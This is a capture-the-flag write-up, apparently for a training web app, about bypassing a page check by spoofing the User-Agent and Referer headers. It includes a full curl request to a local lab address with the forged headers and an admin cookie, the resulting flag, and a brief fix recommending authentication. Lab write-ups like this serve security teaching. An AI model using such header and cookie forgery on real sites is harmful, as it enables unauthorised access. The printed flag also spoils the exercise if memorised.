# SPOOF

### Breach description:

Spoofing the user-agent as ft_bornToSec and our origin to https://www.nsa.gov/ gets us the following flag on the copyright page:

```html
The flag is :
					f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

### Breach Explanation:

This one is a bit odd, essentially the comments in the copyright page give the trail, the implication is that some verifications are done based on these two headers, this would be a **Security Misconfiguration**

```powershell
curl --location 'http://192.168.64.4/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' \
--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' \
--header 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
--header 'Cache-Control: max-age=0' \
--header 'Connection: keep-alive' \
--header 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
--header 'Referer: https://www.nsa.gov/' \
--header 'Sec-GPC: 1' \
--header 'Upgrade-Insecure-Requests: 1' \
--header 'User-Agent: ft_bornToSec'
```

### Breach Fix:

Once again, relying on data that can be affected by anyone with postman, basic knowledge of their web browser’s developer tools, or curl, to grant access to certain pages is probably not a great idea. Using authentication would be a bare minimum.
